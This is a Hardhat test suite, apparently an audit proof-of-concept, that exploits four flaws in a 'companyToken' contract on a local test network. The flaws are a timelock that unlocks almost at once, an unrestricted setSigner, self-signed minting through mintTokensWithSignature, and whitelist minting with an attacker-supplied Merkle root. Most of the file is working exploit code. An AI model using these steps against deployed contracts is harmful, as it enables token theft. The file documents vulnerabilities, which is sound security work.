const { ethers, config } = require('hardhat');
const Web3 = require('web3');
const { expect } = require('chai');
const { MerkleTree } = require("merkletreejs");
const { keccak256 } = require("ethers/lib/utils");
const { time } = require("@nomicfoundation/hardhat-network-helpers");

let web3 = new Web3();

describe('1. Due to improper check for, disbursement period (1 year), & cliffTime (6 months), tokens are unlocked after 2 uints of unix timestamp from the time it was vested.', function () {
    let steve, attacker, employee1, employee2, whitelist1, whitelist2;

    const INITIAL_STEVE_TOKEN_BALANCE = ethers.utils.parseEther('10000');
    const INITIAL_EMPLOYEE_TOKEN_BALANCE = ethers.utils.parseEther('100');

    let whitelistAddresses;

    beforeEach(async function () {
        //for simplicity, say the company has only 2 employee
        //for simplicity, only 2 addresses are whitelisted.
        [steve, attacker, employee1, employee2, whitelist1, whitelist2] = await ethers.getSigners();

        //get list of address for merkle tree
        whitelistAddresses = [whitelist1.address, whitelist2.address];

        //prepare merkle tree for
        const leaves = whitelistAddresses.map((addr) => { return ethers.utils.keccak256(addr); });
        const merkleTree = new MerkleTree(leaves, keccak256, { sortPairs: true });
        const bufToHex = data => data.toString('hex');
        const merkleRoot = '0x' + bufToHex(merkleTree.getRoot());
        // console.log(merkleRoot);

        //prepare for token contract deployment, this will also do the minting.
        const name = "company Token";
        const symbol = "CPY";
        let amount = INITIAL_STEVE_TOKEN_BALANCE;
        const deployer = steve.address;
        const root = merkleRoot;

        //this is token contract deployment
        const companyToken = await ethers.getContractFactory('companyToken', steve);
        this.token = await companyToken.deploy(name, symbol, amount, deployer, root);

        //this is attack contract deployment
        const AttackHT = await ethers.getContractFactory('AttackHT', steve);
        this.attackContract = await AttackHT.deploy(this.token.address);

        expect(
            await this.token.balanceOf(steve.address)
        ).to.equal(INITIAL_STEVE_TOKEN_BALANCE);

        //transfer 100 tokens to employees
        await this.token.connect(steve).transfer(employee1.address, INITIAL_EMPLOYEE_TOKEN_BALANCE);
        await this.token.connect(steve).transfer(employee2.address, INITIAL_EMPLOYEE_TOKEN_BALANCE);

        //verify transfer
        expect(
            await this.token.balanceOf(employee1.address)
        ).to.equal(INITIAL_EMPLOYEE_TOKEN_BALANCE);
        expect(
            await this.token.balanceOf(employee2.address)
        ).to.equal(INITIAL_EMPLOYEE_TOKEN_BALANCE);

        //verify steve balance after transfer
        amount = ethers.utils.parseEther('9800');
        expect(
            await this.token.balanceOf(steve.address)
        ).to.equal(amount);

        //verify if the timelock works
        const disbursementPeriod_ = 3000;
        const timelockedTokens_ = INITIAL_EMPLOYEE_TOKEN_BALANCE;
        const vestTime_ = (await ethers.provider.getBlock("latest")).timestamp + 1000;   //+100 to make the vesting time > block.timestamp
        const cliffTime_ = vestTime_ + 1000;
        await this.token.connect(employee2).newTimeLock(timelockedTokens_, vestTime_, cliffTime_, disbursementPeriod_);
        expect(await this.token.balanceLocked(employee2.address)).to.eq(INITIAL_EMPLOYEE_TOKEN_BALANCE);
    });

    it('1.1 check if no tokens are locked for employee1', async function () {
        //check if no tokens are locked for employee1
        expect(await this.token.balanceLocked(employee1.address)).to.eq(0);
    });

    it('1.2 create a new vulnerable timelock for employee1', async function () {
        //check if no tokens are locked for employee1
        expect(await this.token.balanceLocked(employee1.address)).to.eq(0);

        //create a new timelock for employee1
        const vestTime_ = (await ethers.provider.getBlock("latest")).timestamp + 2;   //+100 to make the vesting time > block.timestamp
        const cliffTime_ = vestTime_;
        const disbursementPeriod_ = 1;
        const timelockedTokens_ = INITIAL_EMPLOYEE_TOKEN_BALANCE;
        await this.token.connect(employee1).newTimeLock(timelockedTokens_, vestTime_, cliffTime_, disbursementPeriod_);
    });

    it('1.3 verify timelock creation', async function () {
        //check if no tokens are locked for employee1
        expect(await this.token.balanceLocked(employee1.address)).to.eq(0);

        //create a new timelock for employee1
        const vestTime_ = (await ethers.provider.getBlock("latest")).timestamp + 2;   //+100 to make the vesting time > block.timestamp
        const cliffTime_ = vestTime_;
        const disbursementPeriod_ = 1;
        const timelockedTokens_ = INITIAL_EMPLOYEE_TOKEN_BALANCE;
        await this.token.connect(employee1).newTimeLock(timelockedTokens_, vestTime_, cliffTime_, disbursementPeriod_);

        //verify timelock
        expect(await this.token.balanceLocked(employee1.address)).to.eq(INITIAL_EMPLOYEE_TOKEN_BALANCE);
    });

    it('1.4 waiting for 3 unit of unix time, we can will get all tokens unlocked.', async function () {
        //check if no tokens are locked for employee1
        expect(await this.token.balanceLocked(employee1.address)).to.eq(0);

        //create a new timelock for employee1
        const vestTime_ = (await ethers.provider.getBlock("latest")).timestamp + 2;   //+100 to make the vesting time > block.timestamp
        const cliffTime_ = vestTime_;
        const disbursementPeriod_ = 1;
        const timelockedTokens_ = INITIAL_EMPLOYEE_TOKEN_BALANCE;
        await this.token.connect(employee1).newTimeLock(timelockedTokens_, vestTime_, cliffTime_, disbursementPeriod_);

        //verify timelock
        expect(await this.token.balanceLocked(employee1.address)).to.eq(INITIAL_EMPLOYEE_TOKEN_BALANCE);

        //waiting for 3 unit of unix time, we can will get all tokens unlocked.
        await time.increase(2);
    });

    it('1.5 confirm if all tokens are unloked for employee1', async function () {
        //check if no tokens are locked for employee1
        expect(await this.token.balanceLocked(employee1.address)).to.eq(0);

        //create a new timelock for employee1
        const vestTime_ = (await ethers.provider.getBlock("latest")).timestamp + 2;   //+100 to make the vesting time > block.timestamp
        const cliffTime_ = vestTime_;
        const disbursementPeriod_ = 1;
        const timelockedTokens_ = INITIAL_EMPLOYEE_TOKEN_BALANCE;
        await this.token.connect(employee1).newTimeLock(timelockedTokens_, vestTime_, cliffTime_, disbursementPeriod_);

        //verify timelock
        expect(await this.token.balanceLocked(employee1.address)).to.eq(INITIAL_EMPLOYEE_TOKEN_BALANCE);

        //waiting for 3 unit of unix time, we can will get all tokens unlocked.
        await time.increase(2);

        //verify timelock
        expect(await this.token.balanceUnlocked(employee1.address)).to.eq(INITIAL_EMPLOYEE_TOKEN_BALANCE);
    });

});


describe('2. Allow any arbitarary users to become signer.', function () {
    let steve, attacker, employee1, employee2, whitelist1, whitelist2;

    const INITIAL_STEVE_TOKEN_BALANCE = ethers.utils.parseEther('10000');
    const INITIAL_EMPLOYEE_TOKEN_BALANCE = ethers.utils.parseEther('100');

    let whitelistAddresses;

    beforeEach(async function () {
        //for simplicity, say the company has only 2 employee
        //for simplicity, only 2 addresses are whitelisted.
        [steve, attacker, employee1, employee2, whitelist1, whitelist2] = await ethers.getSigners();

        //get list of address for merkle tree
        whitelistAddresses = [whitelist1.address, whitelist2.address];

        //prepare merkle tree for
        const leaves = whitelistAddresses.map((addr) => { return ethers.utils.keccak256(addr); });
        const merkleTree = new MerkleTree(leaves, keccak256, { sortPairs: true });
        const bufToHex = data => data.toString('hex');
        const merkleRoot = '0x' + bufToHex(merkleTree.getRoot());
        // console.log(merkleRoot);

        //prepare for token contract deployment, this will also do the minting.
        const name = "company Token";
        const symbol = "CPY";
        let amount = INITIAL_STEVE_TOKEN_BALANCE;
        const deployer = steve.address;
        const root = merkleRoot;

        //this is token contract deployment
        const companyToken = await ethers.getContractFactory('companyToken', steve);
        this.token = await companyToken.deploy(name, symbol, amount, deployer, root);

        //this is attack contract deployment
        const AttackHT = await ethers.getContractFactory('AttackHT', steve);
        this.attackContract = await AttackHT.deploy(this.token.address);

        expect(
            await this.token.balanceOf(steve.address)
        ).to.equal(INITIAL_STEVE_TOKEN_BALANCE);

        //transfer 100 tokens to employees
        await this.token.connect(steve).transfer(employee1.address, INITIAL_EMPLOYEE_TOKEN_BALANCE);
        await this.token.connect(steve).transfer(employee2.address, INITIAL_EMPLOYEE_TOKEN_BALANCE);

        //verify transfer
        expect(
            await this.token.balanceOf(employee1.address)
        ).to.equal(INITIAL_EMPLOYEE_TOKEN_BALANCE);
        expect(
            await this.token.balanceOf(employee2.address)
        ).to.equal(INITIAL_EMPLOYEE_TOKEN_BALANCE);

        //verify steve balance after transfer
        amount = ethers.utils.parseEther('9800');
        expect(
            await this.token.balanceOf(steve.address)
        ).to.equal(amount);

        //verify if the timelock works
        const disbursementPeriod_ = 3000;
        const timelockedTokens_ = INITIAL_EMPLOYEE_TOKEN_BALANCE;
        const vestTime_ = (await ethers.provider.getBlock("latest")).timestamp + 1000;   //+100 to make the vesting time > block.timestamp
        const cliffTime_ = vestTime_ + 1000;
        await this.token.connect(employee2).newTimeLock(timelockedTokens_, vestTime_, cliffTime_, disbursementPeriod_);
        expect(await this.token.balanceLocked(employee2.address)).to.eq(INITIAL_EMPLOYEE_TOKEN_BALANCE);
    });

    it('2.1 Make attacker new signer', async function () {
        //as there is no getters, I cannot verify the current signer.
        //But from the below tests we can clearly see that any arbitarary user can become signer.

        //attacker becomes signer
        await this.token.connect(attacker).setSigner(attacker.address);
    });

    it('2.2 Make employee1 new signer', async function () {
        //as there is no getters, I cannot verify the current signer.
        //But from the below tests we can clearly see that any arbitarary user can become signer.

        //employee1 becomes signer
        await this.token.connect(employee1).setSigner(employee1.address);

        //employee2 becomes signer
        await this.token.connect(employee2).setSigner(employee2.address);
    });

    it('2.3 Make employee2 new signer', async function () {
        //as there is no getters, I cannot verify the current signer.
        //But from the below tests we can clearly see that any arbitarary user can become signer.

        //employee2 becomes signer
        await this.token.connect(employee2).setSigner(employee2.address);
    });
});


describe('3. Allow any arbitarary users to mint tokens using mintTokensWithSignature() function.', function () {
    let steve, attacker, employee1, employee2, whitelist1, whitelist2;

    const INITIAL_STEVE_TOKEN_BALANCE = ethers.utils.parseEther('10000');
    const INITIAL_EMPLOYEE_TOKEN_BALANCE = ethers.utils.parseEther('100');

    let whitelistAddresses;

    beforeEach(async function () {
        //for simplicity, say the company has only 2 employee
        //for simplicity, only 2 addresses are whitelisted.
        [steve, attacker, employee1, employee2, whitelist1, whitelist2] = await ethers.getSigners();

        //get list of address for merkle tree
        whitelistAddresses = [whitelist1.address, whitelist2.address];

        //prepare merkle tree for
        const leaves = whitelistAddresses.map((addr) => { return ethers.utils.keccak256(addr); });
        const merkleTree = new MerkleTree(leaves, keccak256, { sortPairs: true });
        const bufToHex = data => data.toString('hex');
        const merkleRoot = '0x' + bufToHex(merkleTree.getRoot());
        // console.log(merkleRoot);

        //prepare for token contract deployment, this will also do the minting.
        const name = "company Token";
        const symbol = "CPY";
        let amount = INITIAL_STEVE_TOKEN_BALANCE;
        const deployer = steve.address;
        const root = merkleRoot;

        //this is token contract deployment
        const companyToken = await ethers.getContractFactory('companyToken', steve);
        this.token = await companyToken.deploy(name, symbol, amount, deployer, root);

        //this is attack contract deployment
        const AttackHT = await ethers.getContractFactory('AttackHT', steve);
        this.attackContract = await AttackHT.deploy(this.token.address);

        expect(
            await this.token.balanceOf(steve.address)
        ).to.equal(INITIAL_STEVE_TOKEN_BALANCE);

        //transfer 100 tokens to employees
        await this.token.connect(steve).transfer(employee1.address, INITIAL_EMPLOYEE_TOKEN_BALANCE);
        await this.token.connect(steve).transfer(employee2.address, INITIAL_EMPLOYEE_TOKEN_BALANCE);

        //verify transfer
        expect(
            await this.token.balanceOf(employee1.address)
        ).to.equal(INITIAL_EMPLOYEE_TOKEN_BALANCE);
        expect(
            await this.token.balanceOf(employee2.address)
        ).to.equal(INITIAL_EMPLOYEE_TOKEN_BALANCE);

        //verify steve balance after transfer
        amount = ethers.utils.parseEther('9800');
        expect(
            await this.token.balanceOf(steve.address)
        ).to.equal(amount);

        //verify if the timelock works
        const disbursementPeriod_ = 3000;
        const timelockedTokens_ = INITIAL_EMPLOYEE_TOKEN_BALANCE;
        const vestTime_ = (await ethers.provider.getBlock("latest")).timestamp + 1000;   //+100 to make the vesting time > block.timestamp
        const cliffTime_ = vestTime_ + 1000;
        await this.token.connect(employee2).newTimeLock(timelockedTokens_, vestTime_, cliffTime_, disbursementPeriod_);
        expect(await this.token.balanceLocked(employee2.address)).to.eq(INITIAL_EMPLOYEE_TOKEN_BALANCE);
    });

    it('3.1 generate the malicious message to sign.', async function () {
        let amount = ethers.utils.parseEther('100');
        let tokenAddress = this.token.address;
        let attackerAddress = attacker.address;
        let abiCoder;
        let tmpMsg;
        let packedEncoded;
        let sign_obj;

        //get private key of attacker
        const accounts = config.networks.hardhat.accounts;
        const index = 1; // second wallet, increment for next wallets
        const wallet2 = ethers.Wallet.fromMnemonic(accounts.mnemonic, accounts.path + `/${index}`);
        const privateKey2 = wallet2.privateKey;

        //generate the message to sign
        abiCoder = ethers.utils.defaultAbiCoder;
        tmpMsg = abiCoder.encode(["address", "uint", "address"], [tokenAddress, amount, attackerAddress]);
        const message = ethers.utils.keccak256(tmpMsg);

    });

    it('3.2 sign the malicious message', async function () {
        let amount = ethers.utils.parseEther('100');
        let tokenAddress = this.token.address;
        let attackerAddress = attacker.address;
        let abiCoder;
        let tmpMsg;
        let packedEncoded;
        let sign_obj;

        //get private key of attacker
        const accounts = config.networks.hardhat.accounts;
        const index = 1; // second wallet, increment for next wallets
        const wallet2 = ethers.Wallet.fromMnemonic(accounts.mnemonic, accounts.path + `/${index}`);
        const privateKey2 = wallet2.privateKey;

        //generate the message to sign
        abiCoder = ethers.utils.defaultAbiCoder;
        tmpMsg = abiCoder.encode(["address", "uint", "address"], [tokenAddress, amount, attackerAddress]);
        const message = ethers.utils.keccak256(tmpMsg);

        //sign message
        sign_obj = await web3.eth.accounts.sign(message, privateKey2);

        //become signer first
        await this.token.connect(attacker).setSigner(attacker.address);

        //make sure attacker does not own any tokens
        expect(await this.token.balanceOf(attacker.address)).to.eq(0);

        //Attack the `mintTokensWithSignature()` to mint 100 tokens.
        await this.token.connect(attacker).mintTokensWithSignature(amount, sign_obj.r, sign_obj.s, sign_obj.v);

        //after attack balance should be 100 ethers
        expect(await this.token.balanceOf(attacker.address)).to.eq(amount);
    });

    it('3.3 become "signer" of company Token Contract.', async function () {
        let amount = ethers.utils.parseEther('100');
        let tokenAddress = this.token.address;
        let attackerAddress = attacker.address;
        let abiCoder;
        let tmpMsg;
        let packedEncoded;
        let sign_obj;

        //get private key of attacker
        const accounts = config.networks.hardhat.accounts;
        const index = 1; // second wallet, increment for next wallets
        const wallet2 = ethers.Wallet.fromMnemonic(accounts.mnemonic, accounts.path + `/${index}`);
        const privateKey2 = wallet2.privateKey;

        //generate the message to sign
        abiCoder = ethers.utils.defaultAbiCoder;
        tmpMsg = abiCoder.encode(["address", "uint", "address"], [tokenAddress, amount, attackerAddress]);
        const message = ethers.utils.keccak256(tmpMsg);

        //sign message
        sign_obj = await web3.eth.accounts.sign(message, privateKey2);

        //become signer first
        await this.token.connect(attacker).setSigner(attacker.address);
    });

    it('3.4 make sure attacker does not own any tokens.', async function () {
        let amount = ethers.utils.parseEther('100');
        let tokenAddress = this.token.address;
        let attackerAddress = attacker.address;
        let abiCoder;
        let tmpMsg;
        let packedEncoded;
        let sign_obj;

        //get private key of attacker
        const accounts = config.networks.hardhat.accounts;
        const index = 1; // second wallet, increment for next wallets
        const wallet2 = ethers.Wallet.fromMnemonic(accounts.mnemonic, accounts.path + `/${index}`);
        const privateKey2 = wallet2.privateKey;

        //generate the message to sign
        abiCoder = ethers.utils.defaultAbiCoder;
        tmpMsg = abiCoder.encode(["address", "uint", "address"], [tokenAddress, amount, attackerAddress]);
        const message = ethers.utils.keccak256(tmpMsg);

        //sign message
        sign_obj = await web3.eth.accounts.sign(message, privateKey2);

        //become signer first
        await this.token.connect(attacker).setSigner(attacker.address);

        //make sure attacker does not own any tokens
        expect(await this.token.balanceOf(attacker.address)).to.eq(0);
    });

    it('3.5 Attack the `mintTokensWithSignature()` to mint 100 tokens to attacker.', async function () {
        let amount = ethers.utils.parseEther('100');
        let tokenAddress = this.token.address;
        let attackerAddress = attacker.address;
        let abiCoder;
        let tmpMsg;
        let packedEncoded;
        let sign_obj;

        //get private key of attacker
        const accounts = config.networks.hardhat.accounts;
        const index = 1; // second wallet, increment for next wallets
        const wallet2 = ethers.Wallet.fromMnemonic(accounts.mnemonic, accounts.path + `/${index}`);
        const privateKey2 = wallet2.privateKey;

        //generate the message to sign
        abiCoder = ethers.utils.defaultAbiCoder;
        tmpMsg = abiCoder.encode(["address", "uint", "address"], [tokenAddress, amount, attackerAddress]);
        const message = ethers.utils.keccak256(tmpMsg);

        //sign message
        sign_obj = await web3.eth.accounts.sign(message, privateKey2);

        //become signer first
        await this.token.connect(attacker).setSigner(attacker.address);

        //make sure attacker does not own any tokens
        expect(await this.token.balanceOf(attacker.address)).to.eq(0);

        //Attack the `mintTokensWithSignature()` to mint 100 tokens to attacker.
        await this.token.connect(attacker).mintTokensWithSignature(amount, sign_obj.r, sign_obj.s, sign_obj.v);
    });

    it('3.6 after successful attack balance of attacker should be 100 ethers', async function () {
        let amount = ethers.utils.parseEther('100');
        let tokenAddress = this.token.address;
        let attackerAddress = attacker.address;
        let abiCoder;
        let tmpMsg;
        let packedEncoded;
        let sign_obj;

        //get private key of attacker
        const accounts = config.networks.hardhat.accounts;
        const index = 1; // second wallet, increment for next wallets
        const wallet2 = ethers.Wallet.fromMnemonic(accounts.mnemonic, accounts.path + `/${index}`);
        const privateKey2 = wallet2.privateKey;

        //generate the message to sign
        abiCoder = ethers.utils.defaultAbiCoder;
        tmpMsg = abiCoder.encode(["address", "uint", "address"], [tokenAddress, amount, attackerAddress]);
        const message = ethers.utils.keccak256(tmpMsg);

        //sign message
        sign_obj = await web3.eth.accounts.sign(message, privateKey2);

        //become signer first
        await this.token.connect(attacker).setSigner(attacker.address);

        //make sure attacker does not own any tokens
        expect(await this.token.balanceOf(attacker.address)).to.eq(0);

        //Attack the `mintTokensWithSignature()` to mint 100 tokens.
        await this.token.connect(attacker).mintTokensWithSignature(amount, sign_obj.r, sign_obj.s, sign_obj.v);

        //
        expect(await this.token.balanceOf(attacker.address)).to.eq(amount);
    });
});


describe('4. Allow any arbitarary users to mint tokens using mintTokensWithWhitelist() function.', function () {
    let steve, attacker, employee1, employee2, whitelist1, whitelist2;

    const INITIAL_STEVE_TOKEN_BALANCE = ethers.utils.parseEther('10000');
    const INITIAL_EMPLOYEE_TOKEN_BALANCE = ethers.utils.parseEther('100');

    let whitelistAddresses;

    beforeEach(async function () {
        //for simplicity, say the company has only 2 employee
        //for simplicity, only 2 addresses are whitelisted.
        [steve, attacker, employee1, employee2, whitelist1, whitelist2] = await ethers.getSigners();

        //get list of address for merkle tree
        whitelistAddresses = [whitelist1.address, whitelist2.address];

        //prepare merkle tree for
        const leaves = whitelistAddresses.map((addr) => { return ethers.utils.keccak256(addr); });
        const merkleTree = new MerkleTree(leaves, keccak256, { sortPairs: true });
        const bufToHex = data => data.toString('hex');
        const merkleRoot = '0x' + bufToHex(merkleTree.getRoot());
        // console.log(merkleRoot);

        //prepare for token contract deployment, this will also do the minting.
        const name = "company Token";
        const symbol = "CPY";
        let amount = INITIAL_STEVE_TOKEN_BALANCE;
        const deployer = steve.address;
        const root = merkleRoot;

        //this is token contract deployment
        const companyToken = await ethers.getContractFactory('companyToken', steve);
        this.token = await companyToken.deploy(name, symbol, amount, deployer, root);

        //this is attack contract deployment
        const AttackHT = await ethers.getContractFactory('AttackHT', steve);
        this.attackContract = await AttackHT.deploy(this.token.address);

        expect(
            await this.token.balanceOf(steve.address)
        ).to.equal(INITIAL_STEVE_TOKEN_BALANCE);

        //transfer 100 tokens to employees
        await this.token.connect(steve).transfer(employee1.address, INITIAL_EMPLOYEE_TOKEN_BALANCE);
        await this.token.connect(steve).transfer(employee2.address, INITIAL_EMPLOYEE_TOKEN_BALANCE);

        //verify transfer
        expect(
            await this.token.balanceOf(employee1.address)
        ).to.equal(INITIAL_EMPLOYEE_TOKEN_BALANCE);
        expect(
            await this.token.balanceOf(employee2.address)
        ).to.equal(INITIAL_EMPLOYEE_TOKEN_BALANCE);

        //verify steve balance after transfer
        amount = ethers.utils.parseEther('9800');
        expect(
            await this.token.balanceOf(steve.address)
        ).to.equal(amount);

        //verify if the timelock works
        const disbursementPeriod_ = 3000;
        const timelockedTokens_ = INITIAL_EMPLOYEE_TOKEN_BALANCE;
        const vestTime_ = (await ethers.provider.getBlock("latest")).timestamp + 1000;   //+100 to make the vesting time > block.timestamp
        const cliffTime_ = vestTime_ + 1000;
        await this.token.connect(employee2).newTimeLock(timelockedTokens_, vestTime_, cliffTime_, disbursementPeriod_);
        expect(await this.token.balanceLocked(employee2.address)).to.eq(INITIAL_EMPLOYEE_TOKEN_BALANCE);
    });

    it('4.1 create merkle tree and get merkle root', async function () {
        // any arbitarary address to whitlist.
        const whitelistAddresses = [attacker.address];

        // say I want to mint 100 token
        amount = ethers.utils.parseEther('100');

        //create merkle tree and get merkle root
        const leaves = whitelistAddresses.map((addr) => { return ethers.utils.keccak256(addr); });
        const merkleTree = new MerkleTree(leaves, keccak256, { sortPairs: true });
        const bufToHex = data => data.toString('hex');
        const merkleRoot = '0x' + bufToHex(merkleTree.getRoot());
    });

    it('4.2 generate proof keys for an address', async function () {
        // any arbitarary address to whitlist.
        const whitelistAddresses = [attacker.address];

        // say I want to mint 100 token
        amount = ethers.utils.parseEther('100');

        //create merkle tree and get merkle root
        const leaves = whitelistAddresses.map((addr) => { return ethers.utils.keccak256(addr); });
        const merkleTree = new MerkleTree(leaves, keccak256, { sortPairs: true });
        const bufToHex = data => data.toString('hex');
        const merkleRoot = '0x' + bufToHex(merkleTree.getRoot());

        //generate proof keys for an address
        const addressToCheck = attacker.address;
        const leaf = keccak256(addressToCheck);
        const proofKeysBuf = merkleTree.getProof(leaf);
        //we need to only fetch the "data" property and not the complete object.
        const proofKeyHex = proofKeysBuf.map(item => '0x' + bufToHex(item.data));
    });

    it('4.3 make sure attacker does not own any tokens', async function () {
        // any arbitarary address to whitlist.
        const whitelistAddresses = [attacker.address];

        // say I want to mint 100 token
        amount = ethers.utils.parseEther('100');

        //create merkle tree and get merkle root
        const leaves = whitelistAddresses.map((addr) => { return ethers.utils.keccak256(addr); });
        const merkleTree = new MerkleTree(leaves, keccak256, { sortPairs: true });
        const bufToHex = data => data.toString('hex');
        const merkleRoot = '0x' + bufToHex(merkleTree.getRoot());

        //generate proof keys for an address
        const addressToCheck = attacker.address;
        const leaf = keccak256(addressToCheck);
        const proofKeysBuf = merkleTree.getProof(leaf);
        //we need to only fetch the "data" property and not the complete object.
        const proofKeyHex = proofKeysBuf.map(item => '0x' + bufToHex(item.data));

        //make sure attacker does not own any tokens
        expect(await this.token.balanceOf(attacker.address)).to.eq(0);
    });

    it('4.4 Attack the `mintTokensWithSignature()` to mint 100 tokens.', async function () {
        // any arbitarary address to whitlist.
        const whitelistAddresses = [attacker.address];

        // say I want to mint 100 token
        amount = ethers.utils.parseEther('100');

        //create merkle tree and get merkle root
        const leaves = whitelistAddresses.map((addr) => { return ethers.utils.keccak256(addr); });
        const merkleTree = new MerkleTree(leaves, keccak256, { sortPairs: true });
        const bufToHex = data => data.toString('hex');
        const merkleRoot = '0x' + bufToHex(merkleTree.getRoot());

        //generate proof keys for an address
        const addressToCheck = attacker.address;
        const leaf = keccak256(addressToCheck);
        const proofKeysBuf = merkleTree.getProof(leaf);
        //we need to only fetch the "data" property and not the complete object.
        const proofKeyHex = proofKeysBuf.map(item => '0x' + bufToHex(item.data));

        //make sure attacker does not own any tokens
        expect(await this.token.balanceOf(attacker.address)).to.eq(0);

        //Attack the `mintTokensWithSignature()` to mint 100 tokens.
        await this.token.connect(attacker).mintTokensWithWhitelist(amount, merkleRoot, proofKeyHex);
    });

    it('4.5 attacker balance should be 100 tokens after attack', async function () {
        // any arbitarary address to whitlist.
        const whitelistAddresses = [attacker.address];

        // say I want to mint 100 token
        amount = ethers.utils.parseEther('100');

        //create merkle tree and get merkle root
        const leaves = whitelistAddresses.map((addr) => { return ethers.utils.keccak256(addr); });
        const merkleTree = new MerkleTree(leaves, keccak256, { sortPairs: true });
        const bufToHex = data => data.toString('hex');
        const merkleRoot = '0x' + bufToHex(merkleTree.getRoot());

        //generate proof keys for an address
        const addressToCheck = attacker.address;
        const leaf = keccak256(addressToCheck);
        const proofKeysBuf = merkleTree.getProof(leaf);
        //we need to only fetch the "data" property and not the complete object.
        const proofKeyHex = proofKeysBuf.map(item => '0x' + bufToHex(item.data));

        //make sure attacker does not own any tokens
        expect(await this.token.balanceOf(attacker.address)).to.eq(0);

        //Attack the `mintTokensWithSignature()` to mint 100 tokens.
        await this.token.connect(attacker).mintTokensWithWhitelist(amount, merkleRoot, proofKeyHex);

        //after attack balance should be 100 ethers
        expect(await this.token.balanceOf(attacker.address)).to.eq(amount);
    });

});